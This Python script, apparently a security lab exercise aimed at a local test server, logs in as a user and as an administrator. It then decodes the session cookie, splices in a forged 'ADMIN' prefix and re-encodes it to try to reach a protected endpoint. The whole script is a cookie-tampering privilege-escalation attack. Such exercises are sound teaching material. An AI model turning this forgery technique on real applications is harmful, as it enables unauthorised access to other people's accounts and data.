import requests 
import base64
import helper as H
def main(): 
    base_address ="http://127.0.0.1:5000"
    
    login_address = base_address + "/ex3/login"
    work_address  = base_address + "/ex3/list"
    my_json = {"user": "hello", "pass" : " my darling"}


    session = requests.Session()


    # USER LOGIN
    response = session.post(login_address, json= my_json)
    # my_cookies = response.cookies.get("I am error")
    all_cookies = session.cookies.items()
    print(all_cookies)
    print("Login Resopnse1 : " , response.text)
    response = session.post(work_address, json= my_json)
    print("USER work: ", response.text)



    # ADMIN LOGIN 
    my_json["user"] = "administrator"
    my_json["pass"] = "42"

    response = session.post(login_address, json= my_json)
    print("Admin login: ", response.text)
    response = session.post(work_address, json= my_json)
    print("Admin work: ", response.text)

    # print(my_json)

    # ERROR LOGIN
    all_cookies= session.cookies.items()
    print("ALL COOKIES", all_cookies)
    for key, value in session.cookies.items():
        decoded_cookie = H.decode(value)

        value = "\"FAKE, ,,,,ADMIN"+decoded_cookie[6:]
        print("Key, value: ", key, ": ", decoded_cookie)
        encoded_tampered_cookie = H.encode(value)
        # print("Read cookie", session.cookies.get(key))
    session.cookies.set(key, None)
    session.cookies.set(key,encoded_tampered_cookie )
    print("Read cookie", H.decode(session.cookies.get(key)))

    response = session.post(work_address, json= my_json)
    print("ERROR work: ", response.text)


if __name__ =="__main__":
    main()